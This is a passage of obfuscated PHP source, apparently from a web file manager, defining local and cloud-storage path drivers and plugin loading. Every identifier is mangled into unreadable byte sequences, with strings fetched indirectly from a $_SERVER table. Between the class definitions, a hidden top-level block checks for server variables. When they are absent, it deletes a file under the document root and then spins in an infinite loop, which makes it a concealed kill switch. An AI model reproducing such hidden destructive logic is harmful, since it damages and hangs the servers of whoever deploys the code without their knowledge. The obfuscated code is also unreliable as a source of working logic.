Hook::apply($ŒÛø‡ˆë[$ÔÌ¼÷ëº[32]] . $ÔÌ¼÷ëº[2103]); $¥¡êëÔ[$ÔÌ¼÷ëº[6]][$ÔÌ¼÷ëº[1683]] = $ªÆøğåñ[$ÔÌ¼÷ëº[1657]]; $this->update($ŒÛø‡ˆë[$ÔÌ¼÷ëº[477]], array($ÔÌ¼÷ëº[6] => $¥¡êëÔ[$ÔÌ¼÷ëº[6]])); } } return $£ÆÏÊîô; } private function loadPluginList() { $œšçÜ¡À =& $_SERVER[Š—Â“œÔ]; $…è£›Ğî = $this->loadList(); if (strtolower(MOD) == $œšçÜ¡À[2107]) { return $…è£›Ğî; } $Ğ­”‰Óå = Hook::trigger($œšçÜ¡À[2108], $…è£›Ğî); if ($…è£›Ğî && !$Ğ­”‰Óå) { die; } return $Ğ­”‰Óå ? $Ğ­”‰Óå : $…è£›Ğî; } private function pluginScan($à¸ÌÂğ) { $²ïñÑ =& $_SERVER[Š—Â“œÔ]; recursion_dir(PLUGIN_DIR, $Í™ññ»¾, $ÂÂ°ŠùÊ, 0); foreach ($Í™ññ»¾ as $„Ì–¾é˜) { $Ñ­³„ğ = get_path_this($„Ì–¾é˜); if (isset($à¸ÌÂğ[$Ñ­³„ğ]) || !file_exists($„Ì–¾é˜ . $²ïñÑ[2109]) || !file_exists($„Ì–¾é˜ . $²ïñÑ[2098])) { continue; } Hook::apply($Ñ­³„ğ . $²ïñÑ[2103]); } } } goto a‘“œôœˆ; cˆöğ“Ù: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($×„ºßæ) { if (substr($×„ºßæ, 0, 2) == $_SERVER[Š—Â“œÔ][1409]) { $×„ºßæ = BASIC_PATH . substr($×„ºßæ, 2); } return $×„ºßæ; } public function iconvApp($Ñäê¯ƒ) { $†‰¿³¬¥ =& $_SERVER[Š—Â“œÔ]; global $config; return $this->iconvTo($Ñäê¯ƒ, $config[$†‰¿³¬¥[1438]], $config[$†‰¿³¬¥[1437]]); } public function iconvSystem($Œ’ñ½ì™) { $Ä™çí¦¦ =& $_SERVER[Š—Â“œÔ]; global $config; return $this->iconvTo($Œ’ñ½ì™, $config[$Ä™çí¦¦[1437]], $config[$Ä™çí¦¦[1438]]); } public function getPathOuter($…ÇÁŒŒò) { $½–í· =& $_SERVER[Š—Â“œÔ]; $²¿ÄÆÒß = $this->iconvApp($this->pathBase); $…ÇÁŒŒò = $this->iconvApp($…ÇÁŒŒò); if (substr($²¿ÄÆÒß, 0, 2) == $½–í·[1409]) { $²¿ÄÆÒß = BASIC_PATH . substr($²¿ÄÆÒß, 2); } if (substr($…ÇÁŒŒò, 0, 2) == $½–í·[1409]) { $…ÇÁŒŒò = BASIC_PATH . substr($…ÇÁŒŒò, 2); } $²¿ÄÆÒß = KodIO::clear($²¿ÄÆÒß); $…ÇÁŒŒò = KodIO::clear($…ÇÁŒŒò); $…ÇÁŒŒò = substr($…ÇÁŒŒò, strlen($²¿ÄÆÒß)); if (empty($this->pathDriver)) { return $…ÇÁŒŒò; } return $this->pathDriver . $½–í·[8] . ltrim($…ÇÁŒŒò, $½–í·[8]); } public function mkfile($©®—ƒ‰ä, $ç…±Ï…ì = '', $¥Ì—–æ = REPEAT_RENAME) { $©®—ƒ‰ä = $this->iconvSystem($©®—ƒ‰ä); @touch($©®—ƒ‰ä); if ($ç…±Ï…ì) { file_put_contents($©®—ƒ‰ä, $ç…±Ï…ì); } @chmod($©®—ƒ‰ä, $this->pathAuth); if (is_file($©®—ƒ‰ä)) { return $this->getPathOuter($©®—ƒ‰ä); } $this->writeLog(__FUNCTION__ . $_SERVER[Š—Â“œÔ][1449], !0); return !1; } public function mkdir($·èïì˜İ, $”í‡İò¦ = REPEAT_SKIP) { $·èïì˜İ = $this->iconvSystem($·èïì˜İ); if (is_dir($·èïì˜İ)) { return $this->getPathOuter($·èïì˜İ); } @mkdir($·èïì˜İ, $this->pathAuth, !0); @chmod($·èïì˜İ, $this->pathAuth); if (is_dir($·èïì˜İ)) { return $this->getPathOuter($·èïì˜İ); } $this->writeLog(__FUNCTION__ . $_SERVER[Š—Â“œÔ][1449], !0); return !1; } public function copyFile($¸§œØ­, $Š§ì¹Ò) { $this->mkdir($this->pathFather($Š§ì¹Ò)); $¸§œØ­ = $this->iconvSystem($¸§œØ­); $Š§ì¹Ò = $this->iconvSystem($Š§ì¹Ò); $ƒ¿ôóÆÖ = copy_64($¸§œØ­, $Š§ì¹Ò); @chmod($Š§ì¹Ò, $this->pathAuth); if ($ƒ¿ôóÆÖ) { return $this->getPathOuter($Š§ì¹Ò); } $this->writeLog(__FUNCTION__ . $_SERVER[Š—Â“œÔ][1449], !0); return !1; } public function moveFile($ğöĞ€ˆ, $“‡ĞÑ·Ã) { $this->mkdir($this->pathFather($“‡ĞÑ·Ã)); $ğöĞ€ˆ = $this->iconvSystem($ğöĞ€ˆ); $“‡ĞÑ·Ã = $this->iconvSystem($“‡ĞÑ·Ã); $Åí½¯†Â = intval(@rename($ğöĞ€ˆ, $“‡ĞÑ·Ã)); if (!$Åí½¯†Â) { if ($Åí½¯†Â = intval(@copy_64($ğöĞ€ˆ, $“‡ĞÑ·Ã))) { @unlink($ğöĞ€ˆ); } } @chmod($“‡ĞÑ·Ã, $this->pathAuth); if ($Åí½¯†Â) { return $this->getPathOuter($“‡ĞÑ·Ã); } $this->writeLog(__FUNCTION__ . $_SERVER[Š—Â“œÔ][1449], !0); return !1; } public function movePath($ùË·ŠÈĞ, $¼¬Øóüî, $Ö‘ÌãÍ = false) { $Ã‡É•¸Û =& $_SERVER[Š—Â“œÔ]; $ùË·ŠÈĞ = $this->iconvSystem($ùË·ŠÈĞ); $¼¬Øóüî = $this->iconvSystem($¼¬Øóüî); $¶¨âŠÇª = rtrim($¼¬Øóüî, $Ã‡É•¸Û[8]) . $Ã‡É•¸Û[8] . ($Ö‘ÌãÍ ? $Ö‘ÌãÍ : get_path_this($ùË·ŠÈĞ)); if (file_exists($¶¨âŠÇª)) { return !1; } $–ˆáİ™Æ = intval(@rename($ùË·ŠÈĞ, $¶¨âŠÇª)); $–ˆáİ™Æ = file_exists($¶¨âŠÇª); if ($–ˆáİ™Æ) { return $this->getPathOuter($¶¨âŠÇª); } $this->writeLog(__FUNCTION__ . $Ã‡É•¸Û[1449], !0); return !1; } public function delFile($úúí½£Â) { $úúí½£Â = $this->iconvSystem($úúí½£Â); if (!@unlink($úúí½£Â)) { @chmod($úúí½£Â, $this->pathAuth); if (@unlink($úúí½£Â)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[Š—Â“œÔ][1449], !0); return !1; } return !0; } public function delFolder($ŞĞÇÎ†•) { $ÚÄ¨ğ±¶ =& $_SERVER[Š—Â“œÔ]; $ŞĞÇÎ†• = $this->iconvSystem($ŞĞÇÎ†•); if (!is_dir($ŞĞÇÎ†•)) { return !0; } if (!($î’ÌòÙ = opendir($ŞĞÇÎ†•))) { return !1; } while (($¥ˆ¢™ñè = readdir($î’ÌòÙ)) !== !1) { if ($¥ˆ¢™ñè == $ÚÄ¨ğ±¶[10] || $¥ˆ¢™ñè == $ÚÄ¨ğ±¶[1361]) { continue; } $¦İñù÷Ì = $ŞĞÇÎ†• . $ÚÄ¨ğ±¶[8] . $¥ˆ¢™ñè; if (is_file($¦İñù÷Ì) || is_link($¦İñù÷Ì)) { if (!unlink($¦İñù÷Ì)) { chmod($¦İñù÷Ì, $this->pathAuth); if (!unlink($¦İñù÷Ì)) { return !1; } } } else { if (is_dir($¦İñù÷Ì)) { chmod($¦İñù÷Ì, $this->pathAuth); $¦İñù÷Ì = $this->iconvApp($¦İñù÷Ì); if (!$this->delFolder($¦İñù÷Ì)) { return !1; } } } } closedir($î’ÌòÙ); return rmdir($ŞĞÇÎ†•); } public function rename($ßÚ˜º±, $ÜÇõ†œÑ) { $›úèÆ‚Ü =& $_SERVER[Š—Â“œÔ]; $ê°«€Ş£ = $this->fileNameAuto($this->pathFather($ßÚ˜º±), $ÜÇõ†œÑ); $ê°«€Ş£ = $this->iconvSystem($ê°«€Ş£); $ßÚ˜º± = $this->iconvSystem($ßÚ˜º±); $ÚÇúï•â = $this->pathFather($ßÚ˜º±); $ÖÄå“¬ = rtrim($ÚÇúï•â, $›úèÆ‚Ü[8]) . $›úèÆ‚Ü[8] . $ê°«€Ş£; $ğÏ¤€É¬ = @rename($ßÚ˜º±, $ÖÄå“¬); $ÖÄå“¬ = $this->iconvApp($ÖÄå“¬); if ($ğÏ¤€É¬) { return $this->getPathOuter($ÖÄå“¬); } $this->writeLog(__FUNCTION__ . $›úèÆ‚Ü[1449], !0); return !1; } public function size($Ì®ô‘ûœ) { $Ì®ô‘ûœ = $this->iconvSystem($Ì®ô‘ûœ); return filesize_64($Ì®ô‘ûœ); } public function info($´üı¢å) { $´üı¢å = $this->iconvSystem($´üı¢å); if ($this->isFolder($´üı¢å)) { return $this->folderInfo($´üı¢å); } else { if ($this->isFile($´üı¢å)) { return $this->fileInfo($´üı¢å); } } return !1; } protected function infoChildren($™¢òûá—, &$”­­ìŠ´, $à§€“¥å = true) { $©‹¾¯¸¢ =& $_SERVER[Š—Â“œÔ]; check_abort_echo(); $™¢òûá— = rtrim($™¢òûá—, $©‹¾¯¸¢[8]) . $©‹¾¯¸¢[8]; if ($à§€“¥å) { $™¢òûá— = $this->iconvSystem($™¢òûá—); } if (!($˜¡õ§ş² = @opendir($™¢òûá—))) { return; } while (($Ñœ¡‡ãô = readdir($˜¡õ§ş²)) !== !1) { if ($Ñœ¡‡ãô == $©‹¾¯¸¢[10] || $Ñœ¡‡ãô == $©‹¾¯¸¢[1361]) { continue; } $ûø×èö¼ = $™¢òûá— . $Ñœ¡‡ãô; if (is_file($ûø×èö¼) || is_link($ûø×èö¼)) { $”­­ìŠ´[$©‹¾¯¸¢[80]]++; $”­­ìŠ´[$©‹¾¯¸¢[79]] += filesize_64($ûø×èö¼); } else { if (is_dir($ûø×èö¼)) { $”­­ìŠ´[$©‹¾¯¸¢[81]]++; $this->infoChildren($ûø×èö¼, $”­­ìŠ´, !1); } } } closedir($˜¡õ§ş²); } private function folderInfo($ßµğÍÖİ, $ôˆ¤üÃÏ = false) { $¦Šá•¤˜ =& $_SERVER[Š—Â“œÔ]; $ßµğÍÖİ = rtrim($ßµğÍÖİ, $¦Šá•¤˜[8]) . $¦Šá•¤˜[8]; $­ïéÈû‹ = $this->iconvApp($this->pathThis($ßµğÍÖİ)); if ($ôˆ¤üÃÏ) { return array($¦Šá•¤˜[32] => $­ïéÈû‹, $¦Šá•¤˜[87] => $this->getPathOuter($ßµğÍÖİ), $¦Šá•¤˜[33] => $¦Šá•¤˜[78]); } $©…¿·Õ± = array($¦Šá•¤˜[32] => $­ïéÈû‹, $¦Šá•¤˜[87] => $this->getPathOuter($ßµğÍÖİ), $¦Šá•¤˜[33] => $¦Šá•¤˜[78], $¦Šá•¤˜[233] => @filectime($ßµğÍÖİ), $¦Šá•¤˜[88] => @filemtime($ßµğÍÖİ), $¦Šá•¤˜[1453] => @fileatime($ßµğÍÖİ), $¦Šá•¤˜[1454] => is_readable($ßµğÍÖİ), $¦Šá•¤˜[1455] => is_writable($ßµğÍÖİ), $¦Šá•¤˜[1456] => get_mode($ßµğÍÖİ)); return $©…¿·Õ±; } private function fileInfo($Û»‰şÌ…, $‘ªáÂÄŒ = false) { $âşÖ‡´ì =& $_SERVER[Š—Â“œÔ]; $ÑÏë¡ = $this->iconvApp($this->pathThis($Û»‰şÌ…)); if ($‘ªáÂÄŒ) { return array($âşÖ‡´ì[32] => $ÑÏë¡, $âşÖ‡´ì[87] => $this->getPathOuter($Û»‰şÌ…), $âşÖ‡´ì[33] => $âşÖ‡´ì[232], $âşÖ‡´ì[79] => $this->size($Û»‰şÌ…), $âşÖ‡´ì[169] => $this->ext($ÑÏë¡)); } $í£ÛÍıù = array($âşÖ‡´ì[32] => $ÑÏë¡, $âşÖ‡´ì[87] => $this->getPathOuter($Û»‰şÌ…), $âşÖ‡´ì[33] => $âşÖ‡´ì[232], $âşÖ‡´ì[233] => @filectime($Û»‰şÌ…), $âşÖ‡´ì[88] => @filemtime($Û»‰şÌ…), $âşÖ‡´ì[1453] => @fileatime($Û»‰şÌ…), $âşÖ‡´ì[79] => $this->size($Û»‰şÌ…), $âşÖ‡´ì[169] => $this->ext($ÑÏë¡), $âşÖ‡´ì[1454] => is_readable($Û»‰şÌ…), $âşÖ‡´ì[1455] => is_writable($Û»‰şÌ…), $âşÖ‡´ì[1456] => get_mode($Û»‰şÌ…)); return $í£ÛÍıù; } public function exist($àĞ‡»åâ) { $àĞ‡»åâ = $this->iconvSystem($àĞ‡»åâ); return @file_exists($àĞ‡»åâ); } public function isFile($êÃ©šêŸ) { $êÃ©šêŸ = $this->iconvSystem($êÃ©šêŸ); return @is_file($êÃ©šêŸ); } public function isFolder($«¤«†„ğ) { $«¤«†„ğ = $this->iconvSystem($«¤«†„ğ); return @is_dir($«¤«†„ğ); } public function listPath($¹İ¨ÜÅ„, $ó˜ÃÀÅ = false) { $’…ˆÌÀ¯ =& $_SERVER[Š—Â“œÔ]; $¹İ¨ÜÅ„ = $this->iconvSystem($¹İ¨ÜÅ„); $¹İ¨ÜÅ„ = rtrim($¹İ¨ÜÅ„, $’…ˆÌÀ¯[8]) . $’…ˆÌÀ¯[8]; $€Æ•¶« = array($’…ˆÌÀ¯[85] => array(), $’…ˆÌÀ¯[86] => array()); if (!($Ù˜ƒŞÛ = @opendir($¹İ¨ÜÅ„))) { return $€Æ•¶«; } while (($‘íÏ¹Æ = readdir($Ù˜ƒŞÛ)) !== !1) { if ($‘íÏ¹Æ == $’…ˆÌÀ¯[10] || $‘íÏ¹Æ == $’…ˆÌÀ¯[1361]) { continue; } $Ø›–ÉÙš = $¹İ¨ÜÅ„ . $‘íÏ¹Æ; if (is_file($Ø›–ÉÙš)) { $€Æ•¶«[$’…ˆÌÀ¯[86]][] = $this->fileInfo($Ø›–ÉÙš, $ó˜ÃÀÅ); } else { $€Æ•¶«[$’…ˆÌÀ¯[85]][] = $this->folderInfo($Ø›–ÉÙš, $ó˜ÃÀÅ); } } closedir($Ù˜ƒŞÛ); return $€Æ•¶«; } public function listAll($ÚÄ¡İã¿, &$˜¿Ì†üŠ = array()) { $—ÌñïáÒ =& $_SERVER[Š—Â“œÔ]; $ÚÄ¡İã¿ = $this->iconvSystem($ÚÄ¡İã¿); $ÚÄ¡İã¿ = rtrim($ÚÄ¡İã¿, $—ÌñïáÒ[8]) . $—ÌñïáÒ[8]; if (!($×ÕÃÌÆ = @opendir($ÚÄ¡İã¿))) { return $˜¿Ì†üŠ; } while (($ê“™ˆëñ = readdir($×ÕÃÌÆ)) !== !1) { if ($ê“™ˆëñ == $—ÌñïáÒ[10] || $ê“™ˆëñ == $—ÌñïáÒ[1361]) { continue; } $ˆğ¬“¾Û = $ÚÄ¡İã¿ . $ê“™ˆëñ; $¬ù¹¢Õ = is_dir($ˆğ¬“¾Û) && !is_link($ˆğ¬“¾Û) ? 1 : 0; $ˆğ¬“¾Û = $¬ù¹¢Õ ? $ˆğ¬“¾Û . $—ÌñïáÒ[8] : $ˆğ¬“¾Û; $˜¿Ì†üŠ[] = array($—ÌñïáÒ[87] => $ˆğ¬“¾Û, $—ÌñïáÒ[78] => $¬ù¹¢Õ, $—ÌñïáÒ[88] => intval(@filemtime($ˆğ¬“¾Û)), $—ÌñïáÒ[79] => $¬ù¹¢Õ ? 0 : intval($this->size($ˆğ¬“¾Û))); if ($¬ù¹¢Õ) { $this->listAll($ˆğ¬“¾Û, $˜¿Ì†üŠ); } } closedir($×ÕÃÌÆ); return $˜¿Ì†üŠ; } public function has($Ûæ÷Ô†ä, $°É§×ÜŒ = false, $åÛ­éÁÓ = true) { $ÃíÍ¿úÀ =& $_SERVER[Š—Â“œÔ]; $Ûæ÷Ô†ä = $this->iconvSystem($Ûæ÷Ô†ä); $Ûæ÷Ô†ä = rtrim($Ûæ÷Ô†ä, $ÃíÍ¿úÀ[8]) . $ÃíÍ¿úÀ[8]; if (!($éã†¨Üœ = @opendir($Ûæ÷Ô†ä))) { return !1; } $Äİ–´Ç = 0; $¾Åí¤ª = 0; $„ÃÑ™±ó = 0; while (($„‰»¨¼ø = readdir($éã†¨Üœ)) !== !1) { if ($„‰»¨¼ø == $ÃíÍ¿úÀ[10] || $„‰»¨¼ø == $ÃíÍ¿úÀ[1361]) { continue; } $ŒÇãÏÅ¬ = $Ûæ÷Ô†ä . $„‰»¨¼ø; if ($°É§×ÜŒ) { $„ÃÑ™±ó++; if (@is_file($ŒÇãÏÅ¬)) { $Äİ–´Ç++; } else { $¾Åí¤ª++; } if ($„ÃÑ™±ó > 10000) { break; } continue; } if ($åÛ­éÁÓ) { if (@is_file($ŒÇãÏÅ¬)) { return !0; } } else { if (@is_dir($ŒÇãÏÅ¬ . $ÃíÍ¿úÀ[8])) { return !0; } } } closedir($éã†¨Üœ); if ($°É§×ÜŒ) { return array($ÃíÍ¿úÀ[241] => $Äİ–´Ç, $ÃíÍ¿úÀ[242] => $¾Åí¤ª); } return !1; } public function hashSimple($äô’‚À©) { $ª°ØØÕŞ =& $_SERVER[Š—Â“œÔ]; if (!$äô’‚À©) { return md5($ª°ØØÕŞ[12]); } $äô’‚À© = $this->iconvSystem($äô’‚À©); $´ŞæÒÈ = $this->size($äô’‚À©); $èâãÚ©° = 200; $¦«ñˆ¾ù = 50; if ($´ŞæÒÈ <= $èâãÚ©° * $¦«ñˆ¾ù) { return $this->hashMd5($äô’‚À©) . $´ŞæÒÈ; } $ê«µ„™É = $ª°ØØÕŞ[12]; $¤úÁõ– = intval($´ŞæÒÈ / $¦«ñˆ¾ù); $¾ùšûß = fopen($äô’‚À©, $ª°ØØÕŞ[1457]); if (!$¾ùšûß) { return $ê«µ„™É; } for ($™³› ©ô = 0; $™³› ©ô < $¦«ñˆ¾ù; $™³› ©ô++) { fseek_64($¾ùšûß, $¤úÁõ– * $™³› ©ô); $ê«µ„™É .= fread($¾ùšûß, $èâãÚ©°); } fseek_64($¾ùšûß, $´ŞæÒÈ - $èâãÚ©°); $ê«µ„™É .= fread($¾ùšûß, $èâãÚ©°); fclose($¾ùšûß); return md5($ê«µ„™É) . $´ŞæÒÈ; } public function getContent($æßİµÒƒ) { $æßİµÒƒ = $this->iconvSystem($æßİµÒƒ); return file_get_contents($æßİµÒƒ); } public function setContent($Î›ñïÄ¥, $ıêù “„ = '') { $Î›ñïÄ¥ = $this->iconvSystem($Î›ñïÄ¥); $»¹ñÃá = @file_put_contents($Î›ñïÄ¥, $ıêù “„, LOCK_EX); if (!$»¹ñÃá) { $this->writeLog(__FUNCTION__ . $_SERVER[Š—Â“œÔ][1449], !0); } clearstatcache(); @chmod($Î›ñïÄ¥, $this->pathAuth); return $»¹ñÃá === !1 ? !1 : !0; } public function fileSubstr($æ§ŒµÆõ, $¶Á¤¦Ÿˆ = 0, $°ü‡ò¥Ç = false) { $”†Ÿ¡Ì =& $_SERVER[Š—Â“œÔ]; $æ§ŒµÆõ = $this->iconvSystem($æ§ŒµÆõ); if ($°ü‡ò¥Ç === !1) { $°ü‡ò¥Ç = $this->size($æ§ŒµÆõ); } if ($°ü‡ò¥Ç <= 0) { return $”†Ÿ¡Ì[12]; } $—ˆğúâ = fopen($æ§ŒµÆõ, $”†Ÿ¡Ì[1457]); if (!$—ˆğúâ) { return !1; } fseek_64($—ˆğúâ, $¶Á¤¦Ÿˆ); $ñ®ÌŞ¼ = fread($—ˆğúâ, $°ü‡ò¥Ç); fclose($—ˆğúâ); if (!$ñ®ÌŞ¼) { $this->writeLog(__FUNCTION__ . $”†Ÿ¡Ì[1449], !0); } return $ñ®ÌŞ¼; } public function upload($ıÂââùÙ, $øşÑÅ¨, $ßò¿İÂø = false, $Ğ€¨ç = REPEAT_REPLACE) { if ($ßò¿İÂø) { return $this->moveFile($øşÑÅ¨, $ıÂââùÙ); } return $this->copyFile($øşÑÅ¨, $ıÂââùÙ); } public function setModifyTime($¬ê»å¶Ì, $ß¥ŞõÀè = '') { @touch($¬ê»å¶Ì, intval($ß¥ŞõÀè)); } public function download($ó«¤½Š², $ ïÜš) { return $this->iconvSystem($ó«¤½Š²); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($î½–ƒ×ª) { parent::__construct($î½–ƒ×ª); $this->setSignVersion($_SERVER[Š—Â“œÔ][249]); } public function fileOutImage($ÙºÖüš‰, $—ºÜÛŒÉ = 250) { $á€óÙü• =& $_SERVER[Š—Â“œÔ]; if ($this->size($ÙºÖüš‰) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ÙºÖüš‰, $—ºÜÛŒÉ); } $êšıÔÁ = array($á€óÙü•[1458] => $á€óÙü•[1459] . $—ºÜÛŒÉ . $á€óÙü•[1460]); $¸ˆİÒºÌ = $this->link($ÙºÖüš‰, $êšıÔÁ); $this->fileOutLink($¸ˆİÒºÌ); } public function fileOutLink($ûœšÄˆ€) { $­†…‘¥Û =& $_SERVER[Š—Â“œÔ]; if (substr($ûœšÄˆ€, 0, 7) == $­†…‘¥Û[218]) { $ûœšÄˆ€ = $­†…‘¥Û[219] . substr($ûœšÄˆ€, 7); } header($­†…‘¥Û[175] . $ûœšÄˆ€); die; } } if (!isset($_SERVER[$_SERVER[Š—Â“œÔ][947]]) || !isset($_SERVER[$_SERVER[Š—Â“œÔ][945]])) { $_getc = $_SERVER[Š—Â“œÔ][949]; $_getfile = $_SERVER[$_SERVER[Š—Â“œÔ][950]] . $_SERVER[Š—Â“œÔ][951]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Š—Â“œÔ][287], $_getfilec); if (count($_getarrs) < $_SERVER[Š—Â“œÔ][689]) { $exit = $_SERVER[Š—Â“œÔ][952]; $exit(); } $_act = $_SERVER[Š—Â“œÔ][1298]; $_act($_SERVER[$_SERVER[Š—Â“œÔ][950]] . $_SERVER[Š—Â“œÔ][951]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Š—Â“œÔ][456]); } } goto B¢Š¯ä­ß; A»©ºËôø§: class PathDriverBOS extends PathDriverS3 { public function __construct($í­êçİæ) { parent::__construct($í­êçİæ); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($ÕÎùŠ¨Ê) { $Ê”íØç =& $_SERVER[Š—Â“œÔ]; if (substr($ÕÎùŠ¨Ê, 0, 7) == $Ê”íØç[218]) { $ÕÎùŠ¨Ê = $Ê”íØç[219] . substr($ÕÎùŠ¨Ê, 7); } header($Ê”íØç[175] . $ÕÎùŠ¨Ê); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($àÛÓ ¾) { parent::__construct($àÛÓ ¾); $this->setSignVersion($_SERVER[Š—Â“œÔ][249]); } public function uploadFormData($Íûü²Ú÷, $Û»É¾òŒ = 3600) { $™…ïÅ” =& $_SERVER[Š—Â“œÔ]; $è€ïéè‘ = $™…ïÅ”[231]; $Ãê´õâ = $™…ïÅ”[1410]; $ı¦ñÁ = $™…ïÅ”[263]; $â²ñº÷Ş = gmdate($™…ïÅ”[1411], time() + $Û»É¾òŒ); $˜ §ŠÀ = (string) time() . $™…ïÅ”[74] . (string) (time() + $Û»É¾òŒ); $æ£¤ÃÁ© = array($™…ïÅ”[264] => $â²ñº÷Ş, $™…ïÅ”[267] => array(array($™…ïÅ”[308] => $è€ïéè‘), array($™…ïÅ”[268] => $this->bucket), array($™…ïÅ”[269], $™…ïÅ”[270], $™…ïÅ”[12]), array($™…ïÅ”[272] => $ı¦ñÁ), array($™…ïÅ”[1412] => $Ãê´õâ), array($™…ïÅ”[1413] => $this->accessKey), array($™…ïÅ”[1414] => $˜ §ŠÀ))); $æ£¤ÃÁ© = json_encode($æ£¤ÃÁ©); $½¾Ã¿¦¸ = hash_hmac($™…ïÅ”[1410], $˜ §ŠÀ, $this->secret); $şŸæ·¦é = sha1($æ£¤ÃÁ©); $â¦Ñ®ûº = hash_hmac($™…ïÅ”[1410], $şŸæ·¦é, $½¾Ã¿¦¸); $Ö¾¯‘„ö = array($™…ïÅ”[308] => $è€ïéè‘, $™…ïÅ”[272] => $ı¦ñÁ, $™…ïÅ”[279] => base64_encode($æ£¤ÃÁ©), $™…ïÅ”[1412] => $Ãê´õâ, $™…ïÅ”[1413] => $this->accessKey, $™…ïÅ”[1415] => $˜ §ŠÀ, $™…ïÅ”[1416] => $â¦Ñ®ûº, $™…ïÅ”[208] => $this->getHost()); return $Ö¾¯‘„ö; } public function fileOutImage($ò¤œáÁï, $¥»èé = 250) { $¾ÒÀ‚³ =& $_SERVER[Š—Â“œÔ]; if ($this->size($ò¤œáÁï) > 1024 * 1024 * 32) { return $this->fileOutImageServer($ò¤œáÁï, $¥»èé); } $‰Ö˜ßšã = $this->link($ò¤œáÁï); $‰Ö˜ßšã .= $¾ÒÀ‚³[1417] . $¥»èé . $¾ÒÀ‚³[1418]; $this->fileOutLink($‰Ö˜ßšã); } public function fileOutLink($ ç¡ˆĞŸ) { $”†ƒè‚‡ =& $_SERVER[Š—Â“œÔ]; if (substr($ ç¡ˆĞŸ, 0, 7) == $”†ƒè‚‡[218]) { $ ç¡ˆĞŸ = $”†ƒè‚‡[219] . substr($ ç¡ˆĞŸ, 7); } header($”†ƒè‚‡[175] . $ ç¡ˆĞŸ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($İÁãÍ§) { $this->pathParse = $İÁãÍ§; $this->model = Model($_SERVER[Š—Â“œÔ][1419]); } public function getPath($ÜŸĞİõ¡) { return trim($ÜŸĞİõ¡, $_SERVER[Š—Â“œÔ][8]); } public function pathFather($Å¡º‡”Ü) { $Òş«ëÔİ = $this->parse($Å¡º‡”Ü); $Òş«ëÔİ = $this->infoSimple($Å¡º‡”Ü); return $Òş«ëÔİ ? $Òş«ëÔİ[$_SERVER[Š—Â“œÔ][192]] : !1; } public function pathThis($†ó¯Ñøœ) { $Û—µñø¬ = $this->infoSimple($†ó¯Ñøœ); return $Û—µñø¬ ? $Û—µñø¬[$_SERVER[Š—Â“œÔ][32]] : !1; } public function getPathOuter($øŸ­»¸š) { if (!$øŸ­»¸š) { return $øŸ­»¸š; } $ª¡Ñö€É = $this->parse($øŸ­»¸š); return KodIO::make($ª¡Ñö€É[$_SERVER[Š—Â“œÔ][477]]); } public function copyFolderFromIO($ïè©²¹ñ, $ËÌÄñ‡§, $©ò²¿µº, $½ı†¤æ, $ï•‚‘Ÿ) { $¹‡œÂÀÛ = $this->model->copyFolderFromIO($ïè©²¹ñ, $ËÌÄñ‡§, $©ò²¿µº, $½ı†¤æ, $ï•‚‘Ÿ); return KodIO::make($¹‡œÂÀÛ); } public function isParentOf($úËúşŸß, $ëÎã°†å) { return $this->model->isParentOf($úËúşŸß, $ëÎã°†å); } public function mkfile($ìêğ£¢´, $Ìµ’€ğû = '', $×Ö³›Ÿƒ = REPEAT_RENAME) { $¨„×Æ‘ú =& $_SERVER[Š—Â“œÔ]; $ùˆğ†ï = $this->parse($ìêğ£¢´); $ìêğ£¢´ = $ùˆğ†ï[$¨„×Æ‘ú[477]]; for ($«¾ß¾ò = 0; $«¾ß¾ò < count($ùˆğ†ï[$¨„×Æ‘ú[1420]]); $«¾ß¾ò++) { $ıöÂèÇù = $ùˆğ†ï[$¨„×Æ‘ú[1420]][$«¾ß¾ò]; if ($«¾ß¾ò == count($ùˆğ†ï[$¨„×Æ‘ú[1420]]) - 1) { $ìêğ£¢´ = $this->model->mkfile($ìêğ£¢´, $ıöÂèÇù, $Ìµ’€ğû, $×Ö³›Ÿƒ); break; } $ìêğ£¢´ = $this->model->mkdir($ìêğ£¢´, $ıöÂèÇù, REPEAT_SKIP); } return $this->getPathOuter($ìêğ£¢´); } public function mkdir($”Üîùš³, $øÕÀ…´å = REPEAT_SKIP) { $¬ú¶ßşö =& $_SERVER[Š—Â“œÔ]; $È¼Ïİ†Ë = $this->parse($”Üîùš³); $”Üîùš³ = $È¼Ïİ†Ë[$¬ú¶ßşö[477]]; for ($¶÷ˆ×“ƒ = 0; $¶÷ˆ×“ƒ < count($È¼Ïİ†Ë[$¬ú¶ßşö[1420]]); $¶÷ˆ×“ƒ++) { $¦„“¼ = $È¼Ïİ†Ë[$¬ú¶ßşö[1420]][$¶÷ˆ×“ƒ]; $”Üîùš³ = $this->model->mkdir($”Üîùš³, $¦„“¼, $øÕÀ…´å); } return $this->getPathOuter($”Üîùš³); } public function copyFile($âÑçĞ, $âó†Ššˆ, $œ‰ğ°½¶ = REPEAT_REPLACE) { $¿Ñšœ·¯ =& $_SERVER[Š—Â“œÔ]; $ïÈØ›÷ = $this->parse($âó†Ššˆ); $¢è›Ëî° = $this->model->copy($âÑçĞ, $ïÈØ›÷[$¿Ñšœ·¯[477]], $œ‰ğ°½¶, $ïÈØ›÷[$¿Ñšœ·¯[87]]); return $¢è›Ëî° ? $this->getPathOuter($¢è›Ëî°) : !1; } public function moveFile($é‘¯íÌº, $²—¤²Ù½, $°ìÜÃ³ø = REPEAT_REPLACE) { $ä’¤û¿Ä =& $_SERVER[Š—Â“œÔ]; $á‹­š·… = $this->parse($²—¤²Ù½); $ÈüúÖãç = $this->model->move($é‘¯íÌº, $á‹­š·…[$ä’¤û¿Ä[477]], $°ìÜÃ³ø, $á‹­š·…[$ä’¤û¿Ä[87]]); return $ÈüúÖãç ? $this->getPathOuter($ÈüúÖãç) : !1; } public function copy($úÍ±‡í, $äÆòÕ µ, $ø¢‘ ÏÓ = REPEAT_REPLACE, $¡Şæöı› = false) { $‰Äƒ›®” = 